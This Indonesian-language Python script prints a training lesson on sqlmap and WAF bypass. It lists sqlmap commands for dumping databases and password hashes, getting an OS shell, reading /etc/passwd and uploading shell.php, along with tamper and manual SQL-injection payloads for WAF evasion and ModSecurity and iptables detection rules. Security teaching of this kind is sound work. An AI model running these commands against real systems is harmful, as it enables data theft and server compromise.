#!/usr/bin/env python3
"""Sesi 18: SQLMAP & WAF Bypass"""

import subprocess
import sys
import os
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 18")
    print("  SQLMAP & WAF Bypass")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        try:
            subprocess.check_output(["which", name], stderr=subprocess.STDOUT, timeout=5)
            return "✅ TERINSTAL"
        except (subprocess.CalledProcessError, FileNotFoundError, OSError):
            return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] SQLMAP Overview ──
def sqlmap_overview():
    print("""
  💡 SQLMAP adalah tool otomatis untuk mendeteksi dan
     mengeksploitasi SQL Injection.

   ╔═══════════════════════════════════════════════════════╗
   ║  🤖 ROBOT VACUUM                                    ║
   ║     Bayangkan: Kalo manual SQLi itu seperti kamu     ║
   ║     ngepel lantai satu-satu, SQLMAP itu ROBOT        ║
   ║     VACUUM yang ngepel SEMUA ruangan otomatis!       ║
   ║                                                        ║
   ║     SQLMAP = Robot vacuum untuk SQL Injection!       ║
   ╚═══════════════════════════════════════════════════════╝

  Fitur utama SQLMAP:
    • Deteksi otomatis tipe SQLi (boolean, time, error, union)
    • Enumeration database, tabel, kolom, data
    • Password hash cracking (via dictionary)
    • OS shell (via INTO OUTFILE / xp_cmdshell)
    • WAF bypass dengan --tamper scripts
    • Proxy support (Tor, HTTP/SOCKS proxy)
    """)

    sqlmap_status = check_tool("sqlmap")
    print(f"  🔧 SQLMAP status di sistem ini: {sqlmap_status}\n")

    if sqlmap_status == "✅ TERINSTAL":
        try:
            result = subprocess.check_output(["sqlmap", "--version"],
                                             stderr=subprocess.STDOUT, timeout=5).decode().strip()
            print(f"     {result}")
            print()
        except Exception:
            pass


# ── [2] SQLMAP Command Examples ──
def sqlmap_commands():
    print("  💡 SQLMAP COMMAND EXAMPLES:\n")

    print(f"  {'Tujuan':<35} {'Command SQLMAP':<70} {'Keterangan':<30}")
    print(f"  {'─' * 135}")
    commands = [
        ("Basic detection",     "sqlmap -u 'http://target.com/page?id=1'",                   "Deteksi SQLi basic"),
        ("With POST data",      "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'", "POST parameter"),
        ("List databases",      "sqlmap -u 'http://target.com/page?id=1' --dbs",              "Enumerasi database"),
        ("List tables",         "sqlmap -u 'http://target.com/page?id=1' -D dvwa --tables",   "Tabel di database dvwa"),
        ("Dump table",          "sqlmap -u 'http://target.com/page?id=1' -D dvwa -T users --dump", "Dump data users"),
        ("Dump all",            "sqlmap -u 'http://target.com/page?id=1' --dump-all",          "Dump SEMUA data!"),
        ("Columns spec",        "sqlmap -u 'http://target.com/page?id=1' --columns -T users", "Lihat struktur kolom"),
        ("Get current user",    "sqlmap -u 'http://target.com/page?id=1' --current-user",      "User database saat ini"),
        ("Get current DB",      "sqlmap -u 'http://target.com/page?id=1' --current-db",        "Database saat ini"),
        ("DB user password",    "sqlmap -u 'http://target.com/page?id=1' --passwords",         "Crack password hash"),
        ("Search data",         "sqlmap -u 'http://target.com/page?id=1' --search -T user",    "Cari tabel dengan keyword"),
        ("With cookie",         "sqlmap -u 'http://target.com/page?id=1' --cookie='PHPSESSID=abc123'", "Auth session"),
        ("With header",         "sqlmap -u 'http://target.com/page?id=1' --headers='X-Forwarded-For: 127.0.0.1'", "Kustom header"),
        ("Proxy via Tor",       "sqlmap -u 'http://target.com/page?id=1' --proxy='socks4://127.0.0.1:9050'", "Anonim via Tor"),
        ("Batch mode",          "sqlmap -u 'http://target.com/page?id=1' --batch",             "Auto yes (non-interactive)"),
        ("Threads",             "sqlmap -u 'http://target.com/page?id=1' --threads=10",         "Percepat dengan multi thread"),
        ("Risk & Level",        "sqlmap -u 'http://target.com/page?id=1' --level=3 --risk=2",  "Lebih agresif (tapi lebih lambat)"),
    ]
    for tujuan, cmd, ket in commands:
        c_short = cmd[:67] + ".." if len(cmd) > 67 else cmd
        print(f"  {tujuan:<35} {c_short:<70} {ket:<30}")
    print()


# ── [3] OS Shell & Advanced ──
def sqlmap_advanced():
    print("  💡 SQLMAP ADVANCED — OS SHELL & MORE:\n")

    print("""
  🔥 SQLMAP bisa memberikan OS shell jika kondisi mendukung!

  Syarat OS Shell:
    • MySQL: FILE privilege (INTO OUTFILE bisa write file)
    • MSSQL: xp_cmdshell harus aktif (sering dimatikan)
    • PostgreSQL: COPY command untuk write file

  Command:
    sqlmap -u 'http://target.com/page?id=1' --os-shell
    """)

    print(f"  {'Fitur':<35} {'Command':<65} {'Dampak':<30}")
    print(f"  {'─' * 130}")
    advanced = [
        ("OS Shell (MySQL)",        "--os-shell",                            "Shell interaktif di server!"),
        ("OS Shell (MSSQL)",        "--os-shell",                            "xp_cmdshell — RCE penuh"),
        ("SQL Shell",               "--sql-shell",                           "Query SQL langsung"),
        ("File read",               "--file-read=/etc/passwd",               "Baca file server"),
        ("File write",              "--file-write=/tmp/shell.php --file-dest=/var/www/shell.php", "Upload file ke server"),
        ("Reg read (Windows)",      "--reg-read --reg-key='HKLM\\...'",       "Baca registry Windows"),
        ("Stealth mode",            "--random-agent --ignore-proxy --flush-session", "Hindari deteksi"),
        ("Resume session",          "--flush-session",                       "Mulai ulang session SQLMAP"),
        ("Parse sitemap",           "--crawl=3",                              "Crawl site, cari parameter"),
        ("Request from file",       "-r request.txt",                         "Gunakan request Burp Suite"),
    ]
    for fitur, cmd, dampak in advanced:
        c_short = cmd[:62] + ".." if len(cmd) > 62 else cmd
        print(f"  {fitur:<35} {c_short:<65} {dampak:<30}")
    print()

    print("  💡 Contoh output —sql-shell:\n")
    print("""    sql-shell> SELECT host, user FROM mysql.user;
    [*] fetching: SELECT host, user FROM mysql.user
    [*] 5 entries
    host: localhost
    user: root
    ---
    host: 127.0.0.1
    user: root
    ...

    sql-shell> SELECT LOAD_FILE('/etc/passwd');
    [*] fetching: SELECT LOAD_FILE('/etc/passwd')
    [*] root:x:0:0:root:/root:/bin/bash
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    """)
    print()


# ── [4] WAF Types ──
def waf_types():
    print("  💡 WAF — Web Application Firewall:\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  🚪 SATPAM PINTU                                    ║
   ║     Bayangkan: WAF itu SATPAM di pintu masuk gedung.║
   ║     Satpam ngecek semua orang yang mau masuk.        ║
   ║                                                        ║
   ║     Kalo ada orang mencurigakan (payload SQLi),      ║
   ║     satpam TOLAK masuk!                              ║
   ║                                                        ║
   ║     Tapi... satpam bisa DITIPU! (WAF bypass)         ║
   ╚═══════════════════════════════════════════════════════╝

  Tipe WAF:
    • Network-based WAF  → Hardware di jaringan (F5, Citrix)
    • Host-based WAF     → Software di server (ModSecurity)
    • Cloud WAF          → Cloud layer (Cloudflare, AWS WAF, Akamai)
    • Application WAF    → Framework built-in (Spring Security, etc)
    """)

    print(f"  {'Nama WAF':<25} {'Tipe':<25} {'Deteksi':<25} {'Popularitas':<25}")
    print(f"  {'─' * 100}")
    wafs = [
        ("ModSecurity",     "Host-based (Apache/Nginx)",  "Server header",     "✅ Paling populer"),
        ("Cloudflare",      "Cloud WAF",                 "HTTP header: CF-*", "✅ Sangat populer"),
        ("AWS WAF",         "Cloud WAF",                 "AWS header",        "✅ Populer di AWS"),
        ("F5 BIG-IP ASM",   "Network-based",             "Server header",     "✅ Enterprise"),
        ("Akamai Kona",     "Cloud WAF",                 "Akamai header",     "✅ Enterprise"),
        ("Sucuri",          "Cloud WAF",                 "X-Sucuri-ID header","✅ Populer"),
        ("Barracuda",       "Network-based",             "Server header",     "✅ Enterprise"),
        ("Wordfence",       "Host-based (WordPress)",     "Plugin WP",        "✅ WordPress"),
    ]
    for nama, tipe, deteksi, popularitas in wafs:
        print(f"  {nama:<25} {tipe:<25} {deteksi:<25} {popularitas:<25}")
    print()

    print("  💡 Deteksi WAF dengan wafw00f:\n")
    wafw00f_status = check_tool("wafw00f")
    print(f"     wafw00f status: {wafw00f_status}")
    print("     Contoh: wafw00f https://target.com")
    print()


# ── [5] ModSecurity Concept ──
def modsecurity():
    print("  💡 MODSECURITY — Open Source WAF:\n")

    print("""
  ModSecurity adalah WAF open-source paling populer.

  Cara kerja:
    1. Setiap request HTTP dicek terhadap rules
    2. Rules berdasarkan pattern SQLi, XSS, LFI, dll
    3. Jika match → action (block, log, or bypass)

  Core Rule Set (CRS):
    • CRS adalah kumpulan rules default untuk ModSecurity
    • Update rutin via OWASP CRS project
    • Rule ID range: 942xxx untuk SQLi detection

  Contoh rule SQLi di CRS:
    # Rule: Deteksi ' OR 1=1 --
    SecRule REQUEST_COOKIES|REQUEST_HEADERS|ARGS
      "@rx \\\\bOR\\\\b.*\\\\b[0-9]+=[0-9]+\\\\b"
      "id:942100, phase:2, deny, status:403"
    """)

    print(f"  {'Konsep':<30} {'Penjelasan':<55} {'Contoh':<30}")
    print(f"  {'─' * 115}")
    modsec_concepts = [
        ("SecRule",          "Definisi rule deteksi",                "SecRule ARGS '@rx 1=1' 'deny'"),
        ("SecAction",        "Aksi yang dijalankan",                "SecAction 'phase:1,log'"),
        ("CRS",              "Core Rule Set (OWASP)",               "Rules SQLi, XSS, LFI, dll"),
        ("Phase",            "Fase eksekusi (1=request, 2=body)",   "phase:1, phase:2"),
        ("Anomaly Score",    "Skor pelanggaran, block jika tinggi", "anomaly_score > 10"),
        ("Paranoia Level",   "Tingkat keparahan rule (1-4)",        "paranoia_level=2"),
    ]
    for konsep, penjelasan, contoh in modsec_concepts:
        print(f"  {konsep:<30} {penjelasan:<55} {contoh:<30}")
    print()


# ── [6] WAF Bypass Techniques ──
def waf_bypass():
    print("  💡 SQLMAP WAF BYPASS — --tamper:\n")

    print("""
  🛡️  SQLMAP punya --tamper parameter untuk bypass WAF!
     --tamper adalah script Python yang memodifikasi payload
     agar tidak terdeteksi oleh WAF.

  Cara kerja:
    Payload asli: ' OR 1=1 --
    → space2comment: ' OR/**/1=1/**/--
    → base64encode: JyBPUiAxPTEgLS0g
    → charencode: %27%20%4f%52%20%31%3d%31%20%2d%2d
    """)

    print(f"  {'--tamper Script':<30} {'Cara Kerja':<50} {'Target Bypass':<30}")
    print(f"  {'─' * 110}")
    tampers = [
        ("space2comment",    "Ganti spasi dengan /**/",                  "WAF filter spasi"),
        ("space2plus",       "Ganti spasi dengan +",                     "WAF filter spasi"),
        ("space2blank",      "Ganti spasi dengan %09 (tab)",             "WAF filter spasi"),
        ("between",          "Ganti > dengan NOT BETWEEN 0 AND",         "WAF filter operator"),
        ("equaltolike",      "Ganti = dengan LIKE",                      "WAF filter ="),
        ("greatest",         "Ganti > dengan GREATEST()",               "WAF filter >"),
        ("charencode",       "URL-encode semua karakter",                "WAF filter payload mentah"),
        ("charunicodeencode","Unicode-encode karakter",                  "WAF unicode filter"),
        ("base64encode",     "Base64 encode seluruh payload",            "WAF yang liat raw request"),
        ("unmagicquotes",    "Bypass magic_quotes dengan GBK encoding", "MySQL dengan GBK"),
        ("modsecurity",      "Bypass ModSecurity rules",                "ModSecurity CRS rule"),
        ("apostrophemask",   "Ganti ' dengan %80%02 (UTF-16)",          "WAF filter kutip"),
        ("appendnullbyte",   "Tambah null byte di akhir",               "Beberapa parser WAF"),
        ("multiplespaces",   "Ganti spasi dengan banyak spasi",         "WAF regex yang kaku"),
        ("randomcase",       "Acak huruf besar-kecil",                  "WAF case-sensitive"),
        ("commentbeforeparent", "Tambah komentar sebelum ()",           "WAF filter function call"),
        ("versionedkeywords","Gunakan MySQL versioned comment",          "MySQL WAF bypass"),
        ("bluecoat",         "Bypass Blue Coat WAF (spasi + %09)",      "Blue Coat WAF"),
    ]
    for tamper, cara, target in tampers:
        print(f"  {tamper:<30} {cara:<50} {target:<30}")
    print()

    print("  💡 Contoh penggunaan --tamper:\n")
    print("""    # Single tamper
    sqlmap -u 'http://target.com/?id=1' --tamper=space2comment

    # Multiple tamper (combo!)
    sqlmap -u 'http://target.com/?id=1' --tamper=space2comment,equaltolike,randomcase

    # Bypass ModSecurity
    sqlmap -u 'http://target.com/?id=1' --tamper=modsecurity,space2comment

    # Full bypass combo
    sqlmap -u 'http://target.com/?id=1' \\
      --tamper=between,randomcase,space2comment,charencode \\
      --level=3 --risk=2 --random-agent --batch

    # With Tor for anonymity
    sqlmap -u 'http://target.com/?id=1' \\
      --tamper=space2comment --proxy='socks4://127.0.0.1:9050'
    """)

    print("  💡 WAF Bypass tanpa SQLMAP (manual):\n")
    print(f"  {'Teknik Manual':<30} {'Payload Contoh':<50} {'Keterangan':<30}")
    print(f"  {'─' * 110}")
    manual_bypass = [
        ("Case Bypass",        "UnIoN SeLeCt 1,2,3",                  "WAF case-sensitive"),
        ("Comment Bypass",     "UN/**/ION SEL/**/ECT 1,2,3",          "WAF regex kaku"),
        ("Double URL",         "%25%37%35 (double encoding)",          "WAF decode sekali"),
        ("Null Byte",          "UNION%00 SELECT 1,2,3",              "Null byte terminate WAF"),
        ("HTTP Parameter",     "?id=1&id=2&id=UNION SELECT...",       "WAF cek parameter pertama"),
        ("Content-Type",       "Content-Type: multipart/form-data",    "WAF filter POST body"),
        ("HPP (Pollution)",    "?id=1&id=1 UNION SELECT...",          "Parameter pollution"),
    ]
    for teknik, payload, keterangan in manual_bypass:
        p_short = payload[:47] + ".." if len(payload) > 47 else payload
        print(f"  {teknik:<30} {p_short:<50} {keterangan:<30}")
    print()


# ── [7] Live WAF Detection ──
def waf_detection():
    print("  💡 DETEKSI WAF + SQLMAP IDENTIFIKASI:\n")

    print("  SQLMAP mendeteksi WAF secara otomatis:\n")

    print("""    $ sqlmap -u 'http://target.com/?id=1' --identify-waf

    [INFO] testing connection to the target URL
    [INFO] checking if the target is protected by some kind of WAF/IPS
    [INFO] detecting back-end DBMS
    [WARNING] the target URL is protected by:
    --> ModSecurity/2.9.3 (OWASP CRS 3.3.0)
    --> Server: Apache/2.4.41

    [INFO] WAF identified!
    """)

    print(f"  {'Tool Deteksi':<25} {'Command':<60} {'Keterangan':<30}")
    print(f"  {'─' * 115}")
    detection_tools = [
        ("sqlmap",           "--identify-waf",                   "Deteksi WAF otomatis"),
        ("wafw00f",           "wafw00f https://target.com",       "WAF fingerprint"),
        ("curl manual",      "curl -sI https://target.com",      "Cek header HTTP"),
        ("nmap",             "nmap --script http-waf-detect",    "Nmap WAF detection"),
    ]
    for tool_name, cmd, ket in detection_tools:
        print(f"  {tool_name:<25} {cmd:<60} {ket:<30}")
    print()

    print("  💡 Header yang menunjukkan adanya WAF:\n")
    print(f"  {'Header':<45} {'Indikasi WAF':<35}")
    print(f"  {'─' * 80}")
    waf_headers = [
        ("Server: cloudflare",                       "Cloudflare WAF"),
        ("X-Sucuri-ID: ...",                        "Sucuri WAF"),
        ("CF-RAY: ...",                             "Cloudflare"),
        ("X-Mod-Security: ...",                     "ModSecurity"),
        ("X-ASM-...",                               "F5 ASM"),
        ("Set-Cookie: __cfduid=...",                "Cloudflare"),
        ("x-powered-by: AWS-LB-...",                "AWS WAF + LB"),
    ]
    for header, indikasi in waf_headers:
        print(f"  {header:<45} {indikasi:<35}")
    print()


# ── [8] Prevention + Best Practices ──
def prevention():
    print("  💡 BEST PRACTICES — WAF + SQLI PREVENTION:\n")

    print(f"  {'Lapisan':<25} {'Rekomendasi':<55} {'Keterangan':<30}")
    print(f"  {'─' * 110}")
    best_practices = [
        ("Application",    "Prepared statement / ORM",                "Pertahanan utama!"),
        ("Application",    "Input validation & sanitasi",            "Lapisan tambahan"),
        ("Application",    "Least privilege DB user",                "Kurangi dampak"),
        ("WAF",            "Deploy WAF (ModSecurity + CRS)",         "Lapisan jaringan"),
        ("WAF",            "Aktifkan paranoia level 2",              "Tingkatkan deteksi"),
        ("WAF",            "Log & monitor blocked requests",         "Analisis ancaman"),
        ("Network",        "Firewall atur akses DB",                 "DB tidak boleh public"),
        ("Network",        "Separate DB server dari web server",     "Isolasi network"),
        ("DevOps",         "Security code review",                   "Cari SQLi sebelum deploy"),
        ("DevOps",         "DAST scanner rutin",                     "Scan otomatis terjadwal"),
    ]
    for lapisan, rekomendasi, keterangan in best_practices:
        print(f"  {lapisan:<25} {rekomendasi:<55} {keterangan:<30}")
    print()

    print("  🔥 Firewall rule untuk blokir SQLi (iptables example):\n")
    print("""    # Block request dengan pattern SQLi umum
    iptables -A INPUT -p tcp --dport 80 -m string \\
      --string "union select" --algo bm -j DROP

    iptables -A INPUT -p tcp --dport 80 -m string \\
      --string "1=1" --algo bm -j DROP

    # TAPI ini tidak efektif — mudah bypass! Gunakan WAF beneran.
    """)


# ── [9] Analogi ──
def analogi():
    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║   📝 ANALOGI LENGKAP                                    ║
   ║                                                        ║
   ║   SQLMAP = ROBOT VACUUM                                ║
   ║     Kalo manual SQLi itu ngepel lantai satu-satu,     ║
   ║     SQLMAP itu robot vacuum yang ngepel semua          ║
   ║     ruangan otomatis!                                  ║
   ║                                                        ║
   ║   WAF = SATPAM PINTU                                   ║
   ║     Satpam ngecek semua orang yang mau masuk.          ║
   ║     Kalo mencurigakan (payload SQLi), ditolak!         ║
   ║                                                        ║
   ║   ModSecurity = SATPAM DENGAN BUKU PEDOMAN             ║
   ║     Punya buku aturan (CRS) yang lengkap.              ║
   ║     Tapi kadang kelamaan bacanya (false positive).     ║
   ║                                                        ║
   ║   WAF Bypass = NYAMAR JADI ORANG LAIN                 ║
   ║     Attacker mengubah penampilan payload supaya        ║
   ║     tidak dikenali satpam. (--tamper scripts)          ║
   ║                                                        ║
   ║   --tamper = BUKU TIPU-TIPU SATPAM                    ║
   ║     Kumpulan cara mengelabui satpam: ganti baju,      ║
   ║     pakai kacamata, pake bahasa asing, dll.            ║
   ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    banner()

    # ── [1] SQLMAP Overview ──
    section(1, "APA ITU SQLMAP?")
    sqlmap_overview()

    # ── [2] SQLMAP Commands ──
    section(2, "SQLMAP COMMAND EXAMPLES")
    sqlmap_commands()

    # ── [3] SQLMAP Advanced ──
    section(3, "SQLMAP ADVANCED — OS SHELL")
    sqlmap_advanced()

    # ── [4] WAF Types ──
    section(4, "WEB APPLICATION FIREWALL (WAF)")
    waf_types()

    # ── [5] ModSecurity ──
    section(5, "MODSECURITY DEEP DIVE")
    modsecurity()

    # ── [6] WAF Bypass ──
    section(6, "WAF BYPASS TECHNIQUES")
    waf_bypass()

    # ── [7] WAF Detection ──
    section(7, "DETEKSI WAF & SQLMAP IDENTIFICATION")
    waf_detection()

    # ── [8] Prevention ──
    section(8, "BEST PRACTICES & PENCEGAHAN")
    prevention()

    # ── [9] Analogi ──
    section(9, "ANALOGI LENGKAP")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 18 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • SQLMAP: Tool otomatis SQLi detection & exploitation")
    print("    • --dbs, --tables, --dump: Enumerasi data bertahap")
    print("    • --os-shell: Dapatkan shell OS (RCE)")
    print("    • WAF: Satpam di pintu — ModSecurity, Cloudflare, AWS WAF")
    print("    • ModSecurity: WAF open source dengan CRS rules")
    print("    • --tamper: Bypass WAF — space2comment, base64encode, randomcase")
    print("    • --identify-waf: Deteksi WAF otomatis dari SQLMAP")
    print("    • Manual bypass: Case change, comment injection, null byte, HPP")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Cek sqlmap: sqlmap --version (apa sudah terinstall?)")
    print("    2. Basic scan: sqlmap -u 'http://target.com/?id=1' --batch")
    print("    3. Dump database: sqlmap -u 'http://target.com/?id=1' --dbs")
    print("    4. Dump users: sqlmap -u 'http://target.com/?id=1' -D dvwa -T users --dump")
    print("    5. Coba --os-shell di lab yang vulnerable")
    print("    6. Deteksi WAF: sqlmap -u 'http://target.com/?id=1' --identify-waf")
    print("    7. Bypass dengan tamper: --tamper=space2comment,randomcase")
    print("    8. Install wafw00f: deteksi WAF website")
    print("    9. Baca dokumentasi SQLMAP --tamper di GitHub")
    print("    10. Coba berbagai kombinasi tamper untuk bypass WAF")
    print("    11. Pelajari OWASP CRS rule untuk SQLi (942xxx)")
    print("    12. Praktik: cari parameter baru dengan --crawl=3")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
